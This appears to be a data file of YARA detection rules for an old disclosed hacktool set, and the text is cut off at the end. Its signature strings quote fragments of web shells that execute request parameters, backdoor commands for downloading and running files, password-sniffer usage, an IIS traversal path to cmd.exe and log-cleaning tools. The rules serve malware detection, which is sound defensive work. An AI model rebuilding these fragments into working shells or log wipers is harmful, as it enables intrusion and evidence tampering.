  "QQ_zip_Folder_QQ": "rule QQ_zip_Folder_QQ {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file QQ.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"9f8e3f40f1ac8c1fa15a6621b49413d815f46cfb\"\n\tstrings:\n\t\t$s0 = \"EMAIL:haoq@neusoft.com\" fullword wide\n\t\t$s1 = \"EMAIL:haoq@neusoft.com\" fullword wide\n\t\t$s4 = \"QQ2000b.exe\" fullword wide\n\t\t$s5 = \"haoq@neusoft.com\" fullword ascii\n\t\t$s9 = \"QQ2000b.exe\" fullword ascii\n\t\t$s10 = \"\\\\qq2000b.exe\" fullword ascii\n\t\t$s12 = \"WINDSHELL STUDIO[WINDSHELL \" fullword wide\n\t\t$s17 = \"SOFTWARE\\\\HAOQIANG\\\\\" fullword ascii\n\tcondition:\n\t\t5 of them\n}",
  "UnPack_rar_Folder_TBack": "rule UnPack_rar_Folder_TBack {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file TBack.DLL\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"30fc9b00c093cec54fcbd753f96d0ca9e1b2660f\"\n\tstrings:\n\t\t$s0 = \"Redirect SPort RemoteHost RPort       -->Port Redirector\" fullword ascii\n\t\t$s1 = \"http://IP/a.exe a.exe                 -->Download A File\" fullword ascii\n\t\t$s2 = \"StopSniffer                           -->Stop Pass Sniffer\" fullword ascii\n\t\t$s3 = \"TerminalPort Port                     -->Set New Terminal Port\" fullword ascii\n\t\t$s4 = \"Example: Http://12.12.12.12/a.exe abc.exe\" fullword ascii\n\t\t$s6 = \"Create Password Sniffering Thread Successfully. Status:Logging\" fullword ascii\n\t\t$s7 = \"StartSniffer NIC                      -->Start Sniffer\" fullword ascii\n\t\t$s8 = \"Shell                                 -->Get A Shell\" fullword ascii\n\t\t$s11 = \"DeleteService ServiceName             -->Delete A Service\" fullword ascii\n\t\t$s12 = \"Disconnect ThreadNumber|All           -->Disconnect Others\" fullword ascii\n\t\t$s13 = \"Online                                -->List All Connected IP\" fullword ascii\n\t\t$s15 = \"Getting The UserName(%c%s%c)-->ID(0x%s) Successfully\" fullword ascii\n\t\t$s16 = \"Example: Set REG_SZ Test Trojan.exe\" fullword ascii\n\t\t$s18 = \"Execute Program                       -->Execute A Program\" fullword ascii\n\t\t$s19 = \"Reboot                                -->Reboot The System\" fullword ascii\n\t\t$s20 = \"Password Sniffering Is Not Running\" fullword ascii\n\tcondition:\n\t\t4 of them\n}",
  "sig_238_cmd_2": "rule sig_238_cmd_2 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file cmd.jsp\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"be4073188879dacc6665b6532b03db9f87cfc2bb\"\n\tstrings:\n\t\t$s0 = \"Process child = Runtime.getRuntime().exec(\" ascii\n\t\t$s1 = \"InputStream in = child.getInputStream();\" fullword ascii\n\t\t$s2 = \"String cmd = request.getParameter(\\\"\" ascii\n\t\t$s3 = \"while ((c = in.read()) != -1) {\" fullword ascii\n\t\t$s4 = \"<%@ page import=\\\"java.io.*\\\" %>\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule RangeScan {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file RangeScan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"bace2c65ea67ac4725cb24aa9aee7c2bec6465d7\"\n\tstrings:\n\t\t$s0 = \"RangeScan.EXE\" fullword wide\n\t\t$s4 = \"<br><p align=\\\"center\\\"><b>RangeScan \" fullword ascii\n\t\t$s9 = \"Produced by isn0\" fullword ascii\n\t\t$s10 = \"RangeScan\" fullword wide\n\t\t$s20 = \"%d-%d-%d %d:%d:%d\" fullword ascii\n\tcondition:\n\t\t3 of them\n}\n\nrule XYZCmd_zip_Folder_Readme {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file Readme.txt\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"967cb87090acd000d22e337b8ce4d9bdb7c17f70\"\n\tstrings:\n\t\t$s3 = \"3.xyzcmd \\\\\\\\RemoteIP /user:Administrator /pwd:1234 /nowait trojan.exe\" fullword ascii\n\t\t$s20 = \"XYZCmd V1.0\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule ByPassFireWall_zip_Folder_Inject {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file Inject.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"34f564301da528ce2b3e5907fd4b1acb7cb70728\"\n\tstrings:\n\t\t$s6 = \"Fail To Inject\" fullword ascii\n\t\t$s7 = \"BtGRemote Pro; V1.5 B/{\" fullword ascii\n\t\t$s11 = \" Successfully\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_sqlcmd {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file sqlcmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 40\n\t\thash = \"b6e356ce6ca5b3c932fa6028d206b1085a2e1a9a\"\n\tstrings:\n\t\t$s0 = \"Permission denial to EXEC command.:(\" fullword ascii\n\t\t$s3 = \"by Eyas<cooleyas@21cn.com>\" fullword ascii\n\t\t$s4 = \"Connect to %s MSSQL server success.Enjoy the shell.^_^\" fullword ascii\n\t\t$s5 = \"Usage: %s <host> <uid> <pwd>\" fullword ascii\n\t\t$s6 = \"SqlCmd2.exe Inside Edition.\" fullword ascii\n\t\t$s7 = \"Http://www.patching.net  2000/12/14\" fullword ascii\n\t\t$s11 = \"Example: %s 192.168.0.1 sa \\\"\\\"\" fullword ascii\n\tcondition:\n\t\t4 of them\n}\n\nrule ASPack_ASPACK {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file ASPACK.EXE\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"c589e6fd48cfca99d6335e720f516e163f6f3f42\"\n\tstrings:\n\t\t$s0 = \"ASPACK.EXE\" fullword wide\n\t\t$s5 = \"CLOSEDFOLDER\" fullword wide\n\t\t$s10 = \"ASPack compressor\" fullword wide\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_2323 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file 2323.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"21812186a9e92ee7ddc6e91e4ec42991f0143763\"\n\tstrings:\n\t\t$s0 = \"port - Port to listen on, defaults to 2323\" fullword ascii\n\t\t$s1 = \"Usage: srvcmd.exe [/h] [port]\" fullword ascii\n\t\t$s3 = \"Failed to execute shell\" fullword ascii\n\t\t$s5 = \"/h   - Hide Window\" fullword ascii\n\t\t$s7 = \"Accepted connection from client at %s\" fullword ascii\n\t\t$s9 = \"Error %d: %s\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule Jc_ALL_WinEggDropShell_rar_Folder_Install_2 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file Install.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"95866e917f699ee74d4735300568640ea1a05afd\"\n\tstrings:\n\t\t$s1 = \"http://go.163.com/sdemo\" fullword wide\n\t\t$s2 = \"Player.tmp\" fullword ascii\n\t\t$s3 = \"Player.EXE\" fullword wide\n\t\t$s4 = \"mailto:sdemo@263.net\" fullword ascii\n\t\t$s5 = \"S-Player.exe\" fullword ascii\n\t\t$s9 = \"http://www.BaiXue.net (\" fullword wide\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_TFTPD32 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file TFTPD32.EXE\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"5c5f8c1a2fa8c26f015e37db7505f7c9e0431fe8\"\n\tstrings:\n\t\t$s0 = \" http://arm.533.net\" fullword ascii\n\t\t$s1 = \"Tftpd32.hlp\" fullword ascii\n\t\t$s2 = \"Timeouts and Ports should be numerical and can not be 0\" fullword ascii\n\t\t$s3 = \"TFTPD32 -- \" fullword wide\n\t\t$s4 = \"%d -- %s\" fullword ascii\n\t\t$s5 = \"TIMEOUT while waiting for Ack block %d. file <%s>\" fullword ascii\n\t\t$s12 = \"TftpPort\" fullword ascii\n\t\t$s13 = \"Ttftpd32BackGround\" fullword ascii\n\t\t$s17 = \"SOFTWARE\\\\TFTPD32\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_iecv {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file iecv.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"6e6e75350a33f799039e7a024722cde463328b6d\"\n\tstrings:\n\t\t$s1 = \"Edit The Content Of Cookie \" fullword wide\n\t\t$s3 = \"Accessories\\\\wordpad.exe\" fullword ascii\n\t\t$s4 = \"gorillanation.com\" fullword ascii\n\t\t$s5 = \"Before editing the content of a cookie, you should close all windows of Internet\" ascii\n\t\t$s12 = \"http://nirsoft.cjb.net\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule Antiy_Ports_1_21 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file Antiy Ports 1.21.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"ebf4bcc7b6b1c42df6048d198cbe7e11cb4ae3f0\"\n\tstrings:\n\t\t$s0 = \"AntiyPorts.EXE\" fullword wide\n\t\t$s7 = \"AntiyPorts MFC Application\" fullword wide\n\t\t$s20 = \" @Stego:\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule perlcmd_zip_Folder_cmd {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file cmd.cgi\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"21b5dc36e72be5aca5969e221abfbbdd54053dd8\"\n\tstrings:\n\t\t$s0 = \"syswrite(STDOUT, \\\"Content-type: text/html\\\\r\\\\n\\\\r\\\\n\\\", 27);\" fullword ascii\n\t\t$s1 = \"s/%20/ /ig;\" fullword ascii\n\t\t$s2 = \"syswrite(STDOUT, \\\"\\\\r\\\\n</PRE></HTML>\\\\r\\\\n\\\", 17);\" fullword ascii\n\t\t$s4 = \"open(STDERR, \\\">&STDOUT\\\") || die \\\"Can't redirect STDERR\\\";\" fullword ascii\n\t\t$s5 = \"$_ = $ENV{QUERY_STRING};\" fullword ascii\n\t\t$s6 = \"$execthis = $_;\" fullword ascii\n\t\t$s7 = \"system($execthis);\" fullword ascii\n\t\t$s12 = \"s/%2f/\\\\//ig;\" fullword ascii\n\tcondition:\n\t\t6 of them\n}\n\nrule aspbackdoor_asp3 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file asp3.txt\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"e5588665ca6d52259f7d9d0f13de6640c4e6439c\"\n\tstrings:\n\t\t$s0 = \"<form action=\\\"changepwd.asp\\\" method=\\\"post\\\"> \" fullword ascii\n\t\t$s1 = \"  Set oUser = GetObject(\\\"WinNT://ComputerName/\\\" & UserName) \" fullword ascii\n\t\t$s2 = \"    value=\\\"<%=Request.ServerVariables(\\\"LOGIN_USER\\\")%>\\\"> \" fullword ascii\n\t\t$s14 = \" Windows NT \" fullword ascii\n\t\t$s16 = \" WIndows 2000 \" fullword ascii\n\t\t$s18 = \"OldPwd = Request.Form(\\\"OldPwd\\\") \" fullword ascii\n\t\t$s19 = \"NewPwd2 = Request.Form(\\\"NewPwd2\\\") \" fullword ascii\n\t\t$s20 = \"NewPwd1 = Request.Form(\\\"NewPwd1\\\") \" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_FPipe {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file FPipe.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"41d57d356098ff55fe0e1f0bcaa9317df5a2a45c\"\n\tstrings:\n\t\t$s0 = \"made to port 80 of the remote machine at 192.168.1.101 with the\" fullword ascii\n\t\t$s1 = \"Unable to resolve hostname \\\"%s\\\"\" fullword ascii\n\t\t$s2 = \"source port for that outbound connection being set to 53 also.\" fullword ascii\n\t\t$s3 = \" -s    - outbound source port number\" fullword ascii\n\t\t$s5 = \"http://www.foundstone.com\" fullword ascii\n\t\t$s20 = \"Attempting to connect to %s port %d\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_concon {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file concon.com\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"816b69eae66ba2dfe08a37fff077e79d02b95cc1\"\n\tstrings:\n\t\t$s0 = \"Usage: concon \\\\\\\\ip\\\\sharename\\\\con\\\\con\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule aspbackdoor_regdll {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file regdll.asp\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"5c5e16a00bcb1437bfe519b707e0f5c5f63a488d\"\n\tstrings:\n\t\t$s1 = \"exitcode = oShell.Run(\\\"c:\\\\WINNT\\\\system32\\\\regsvr32.exe /u/s \\\" & strFile, 0, \" ascii\n\t\t$s3 = \"oShell.Run \\\"c:\\\\WINNT\\\\system32\\\\regsvr32.exe /u/s \\\" & strFile, 0, False\" fullword ascii\n\t\t$s4 = \"EchoB(\\\"regsvr32.exe exitcode = \\\" & exitcode)\" fullword ascii\n\t\t$s5 = \"Public Property Get oFS()\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule CleanIISLog {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file CleanIISLog.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"827cd898bfe8aa7e9aaefbe949d26298f9e24094\"\n\tstrings:\n\t\t$s1 = \"CleanIP - Specify IP Address Which You Want Clear.\" fullword ascii\n\t\t$s2 = \"LogFile - Specify Log File Which You Want Process.\" fullword ascii\n\t\t$s8 = \"CleanIISLog Ver\" fullword ascii\n\t\t$s9 = \"msftpsvc\" fullword ascii\n\t\t$s10 = \"Fatal Error: MFC initialization failed\" fullword ascii\n\t\t$s11 = \"Specified \\\"ALL\\\" Will Process All Log Files.\" fullword ascii\n\t\t$s12 = \"Specified \\\".\\\" Will Clean All IP Record.\" fullword ascii\n\t\t$s16 = \"Service %s Stopped.\" fullword ascii\n\t\t$s20 = \"Process Log File %s...\" fullword ascii\n\tcondition:\n\t\t5 of them\n}\n\nrule sqlcheck {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file sqlcheck.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"5a5778ac200078b627db84fdc35bf5bcee232dc7\"\n\tstrings:\n\t\t$s0 = \"Power by eyas<cooleyas@21cn.com>\" fullword ascii\n\t\t$s3 = \"\\\\ipc$ \\\"\\\" /user:\\\"\\\"\" fullword ascii\n\t\t$s4 = \"SQLCheck can only scan a class B network. Try again.\" fullword ascii\n\t\t$s14 = \"Example: SQLCheck 192.168.0.1 192.168.0.254\" fullword ascii\n\t\t$s20 = \"Usage: SQLCheck <StartIP> <EndIP>\" fullword ascii\n\tcondition:\n\t\t3 of them\n}\n\nrule sig_238_RunAsEx {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file RunAsEx.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"a22fa4e38d4bf82041d67b4ac5a6c655b2e98d35\"\n\tstrings:\n\t\t$s0 = \"RunAsEx By Assassin 2000. All Rights Reserved. http://www.netXeyes.com\" fullword ascii\n\t\t$s8 = \"cmd.bat\" fullword ascii\n\t\t$s9 = \"Note: This Program Can'nt Run With Local Machine.\" fullword ascii\n\t\t$s11 = \"%s Execute Succussifully.\" fullword ascii\n\t\t$s12 = \"winsta0\" fullword ascii\n\t\t$s15 = \"Usage: RunAsEx <UserName> <Password> <Execute File> [\\\"Execute Option\\\"]\" fullword ascii\n\tcondition:\n\t\t4 of them\n}\n\nrule sig_238_nbtdump {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file nbtdump.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"cfe82aad5fc4d79cf3f551b9b12eaf9889ebafd8\"\n\tstrings:\n\t\t$s0 = \"Creation of results file - \\\"%s\\\" failed.\" fullword ascii\n\t\t$s1 = \"c:\\\\>nbtdump remote-machine\" fullword ascii\n\t\t$s7 = \"Cerberus NBTDUMP\" fullword ascii\n\t\t$s11 = \"<CENTER><H1>Cerberus Internet Scanner</H1>\" fullword ascii\n\t\t$s18 = \"<P><H3>Account Information</H3><PRE>\" fullword wide\n\t\t$s19 = \"%s's password is %s</H3>\" fullword wide\n\t\t$s20 = \"%s's password is blank</H3>\" fullword wide\n\tcondition:\n\t\t5 of them\n}\n\nrule sig_238_Glass2k {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file Glass2k.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"b05455a1ecc6bc7fc8ddef312a670f2013704f1a\"\n\tstrings:\n\t\t$s0 = \"Portions Copyright (c) 1997-1999 Lee Hasiuk\" fullword ascii\n\t\t$s1 = \"C:\\\\Program Files\\\\Microsoft Visual Studio\\\\VB98\" fullword ascii\n\t\t$s3 = \"WINNT\\\\System32\\\\stdole2.tlb\" fullword ascii\n\t\t$s4 = \"Glass2k.exe\" fullword wide\n\t\t$s7 = \"NeoLite Executable File Compressor\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule SplitJoin_V1_3_3_rar_Folder_3 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file splitjoin.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"21409117b536664a913dcd159d6f4d8758f43435\"\n\tstrings:\n\t\t$s2 = \"ie686@sohu.com\" fullword ascii\n\t\t$s3 = \"splitjoin.exe\" fullword ascii\n\t\t$s7 = \"SplitJoin\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule aspbackdoor_EDIT {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file EDIT.ASP\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"12196cf62931cde7b6cb979c07bb5cc6a7535cbb\"\n\tstrings:\n\t\t$s1 = \"<meta HTTP-EQUIV=\\\"Content-Type\\\" CONTENT=\\\"text/html;charset=gb_2312-80\\\">\" fullword ascii\n\t\t$s2 = \"Set thisfile = fs.GetFile(whichfile)\" fullword ascii\n\t\t$s3 = \"response.write \\\"<a href='index.asp'>\" fullword ascii\n\t\t$s5 = \"if Request.Cookies(\\\"password\\\")=\\\"juchen\\\" then \" fullword ascii\n\t\t$s6 = \"Set thisfile = fs.OpenTextFile(whichfile, 1, False)\" fullword ascii\n\t\t$s7 = \"color: rgb(255,0,0); text-decoration: underline }\" fullword ascii\n\t\t$s13 = \"if Request(\\\"creat\\\")<>\\\"yes\\\" then\" fullword ascii\n\tcondition:\n\t\t5 of them\n}\n\nrule aspbackdoor_entice {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file entice.asp\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"e273a1b9ef4a00ae4a5d435c3c9c99ee887cb183\"\n\tstrings:\n\t\t$s0 = \"<Form Name=\\\"FormPst\\\" Method=\\\"Post\\\" Action=\\\"entice.asp\\\">\" fullword ascii\n\t\t$s2 = \"if left(trim(request(\\\"sqllanguage\\\")),6)=\\\"select\\\" then\" fullword ascii\n\t\t$s4 = \"conndb.Execute(sqllanguage)\" fullword ascii\n\t\t$s5 = \"<!--#include file=sqlconn.asp-->\" fullword ascii\n\t\t$s6 = \"rstsql=\\\"select * from \\\"&rstable(\\\"table_name\\\")\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule FPipe2_0 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file FPipe2.0.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"891609db7a6787575641154e7aab7757e74d837b\"\n\tstrings:\n\t\t$s0 = \"made to port 80 of the remote machine at 192.168.1.101 with the\" fullword ascii\n\t\t$s1 = \"Unable to resolve hostname \\\"%s\\\"\" fullword ascii\n\t\t$s2 = \" -s    - outbound connection source port number\" fullword ascii\n\t\t$s3 = \"source port for that outbound connection being set to 53 also.\" fullword ascii\n\t\t$s4 = \"http://www.foundstone.com\" fullword ascii\n\t\t$s19 = \"FPipe\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule InstGina {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file InstGina.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"5317fbc39508708534246ef4241e78da41a4f31c\"\n\tstrings:\n\t\t$s0 = \"To Open Registry\" fullword ascii\n\t\t$s4 = \"I love Candy very much!!\" ascii\n\t\t$s5 = \"GinaDLL\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule ArtTray_zip_Folder_ArtTray {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file ArtTray.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"ee1edc8c4458c71573b5f555d32043cbc600a120\"\n\tstrings:\n\t\t$s0 = \"http://www.brigsoft.com\" fullword wide\n\t\t$s2 = \"ArtTrayHookDll.dll\" fullword ascii\n\t\t$s3 = \"ArtTray Version 1.0 \" fullword wide\n\t\t$s16 = \"TRM_HOOKCALLBACK\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_findoor {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file findoor.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"cdb1ececceade0ecdd4479ecf55b0cc1cf11cdce\"\n\tstrings:\n\t\t$s0 = \"(non-Win32 .EXE or error in .EXE image).\" fullword ascii\n\t\t$s8 = \"PASS hacker@hacker.com\" fullword ascii\n\t\t$s9 = \"/scripts/..%c1%1c../winnt/system32/cmd.exe\" fullword ascii\n\t\t$s10 = \"MAIL FROM:hacker@hacker.com\" fullword ascii\n\t\t$s11 = \"http://isno.yeah.net\" fullword ascii\n\tcondition:\n\t\t4 of them\n}\n\nrule aspbackdoor_ipclear {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file ipclear.vbs\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"9f8fdfde4b729516330eaeb9141fb2a7ff7d0098\"\n\tstrings:\n\t\t$s0 = \"Set ServiceObj = GetObject(\\\"WinNT://\\\" & objNet.ComputerName & \\\"/w3svc\\\")\" fullword ascii\n\t\t$s1 = \"wscript.Echo \\\"USAGE:KillLog.vbs LogFileName YourIP.\\\"\" fullword ascii\n\t\t$s2 = \"Set txtStreamOut = fso.OpenTextFile(destfile, ForWriting, True)\" fullword ascii\n\t\t$s3 = \"Set objNet = WScript.CreateObject( \\\"WScript.Network\\\" )\" fullword ascii\n\t\t$s4 = \"Set fso = CreateObject(\\\"Scripting.FileSystemObject\\\")\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule WinEggDropShellFinal_zip_Folder_InjectT {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file InjectT.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"516e80e4a25660954de8c12313e2d7642bdb79dd\"\n\tstrings:\n\t\t$s0 = \"Packed by exe32pack\" ascii\n\t\t$s1 = \"2TInject.Dll\" fullword ascii\n\t\t$s2 = \"Windows Services\" fullword ascii\n\t\t$s3 = \"Findrst6\" fullword ascii\n\t\t$s4 = \"Press Any Key To Continue......\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_rshsvc {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file rshsvc.bat\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"fb15c31254a21412aecff6a6c4c19304eb5e7d75\"\n\tstrings:\n\t\t$s0 = \"if not exist %1\\\\rshsetup.exe goto ERROR2\" fullword ascii\n\t\t$s1 = \"ECHO rshsetup.exe is not found in the %1 directory\" fullword ascii\n\t\t$s9 = \"REM %1 directory must have rshsetup.exe,rshsvc.exe and rshsvc.dll\" fullword ascii\n\t\t$s10 = \"copy %1\\\\rshsvc.exe\" fullword ascii\n\t\t$s12 = \"ECHO Use \\\"net start rshsvc\\\" to start the service.\" fullword ascii\n\t\t$s13 = \"rshsetup %SystemRoot%\\\\system32\\\\rshsvc.exe %SystemRoot%\\\\system32\\\\rshsvc.dll\" fullword ascii\n\t\t$s18 = \"pushd %SystemRoot%\\\\system32\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule gina_zip_Folder_gina {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file gina.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"e0429e1b59989cbab6646ba905ac312710f5ed30\"\n\tstrings:\n\t\t$s0 = \"NEWGINA.dll\" fullword ascii\n\t\t$s1 = \"LOADER ERROR\" fullword ascii\n\t\t$s3 = \"WlxActivateUserShell\" fullword ascii\n\t\t$s6 = \"WlxWkstaLockedSAS\" fullword ascii\n\t\t$s13 = \"WlxIsLockOk\" fullword ascii\n\t\t$s14 = \"The procedure entry point %s could not be located in the dynamic link library %s\" fullword ascii\n\t\t$s16 = \"WlxShutdown\" fullword ascii\n\t\t$s17 = \"The ordinal %u could not be located in the dynamic link library %s\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule superscan3_0 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file superscan3.0.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"a9a02a14ea4e78af30b8b4a7e1c6ed500a36bc4d\"\n\tstrings:\n\t\t$s0 = \"\\\\scanner.ini\" fullword ascii\n\t\t$s1 = \"\\\\scanner.exe\" fullword ascii\n\t\t$s2 = \"\\\\scanner.lst\" fullword ascii\n\t\t$s4 = \"\\\\hensss.lst\" fullword ascii\n\t\t$s5 = \"STUB32.EXE\" fullword wide\n\t\t$s6 = \"STUB.EXE\" fullword wide\n\t\t$s8 = \"\\\\ws2check.exe\" fullword ascii\n\t\t$s9 = \"\\\\trojans.lst\" fullword ascii\n\t\t$s10 = \"1996 InstallShield Software Corporation\" fullword wide\n\tcondition:\n\t\tall of them\n}\n\nrule sig_238_xsniff {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file xsniff.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"d61d7329ac74f66245a92c4505a327c85875c577\"\n\tstrings:\n\t\t$s2 = \"xsiff.exe -pass -hide -log pass.log\" fullword ascii\n\t\t$s3 = \"%s - simple sniffer for win2000\" fullword ascii\n\t\t$s4 = \"xsiff.exe -tcp -udp -asc -addr 192.168.1.1\" fullword ascii\n\t\t$s5 = \"HOST: %s USER: %s, PASS: %s\" fullword ascii\n\t\t$s7 = \"http://www.xfocus.org\" fullword ascii\n\t\t$s9 = \"  -pass        : Filter username/password\" fullword ascii\n\t\t$s18 = \"  -udp         : Output udp packets\" fullword ascii\n\t\t$s19 = \"Code by glacier <glacier@xfocus.org>\" fullword ascii\n\t\t$s20 = \"  -tcp         : Output tcp packets\" fullword ascii\n\tcondition:\n\t\t6 of them\n}\n\nrule sig_238_fscan {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file fscan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = 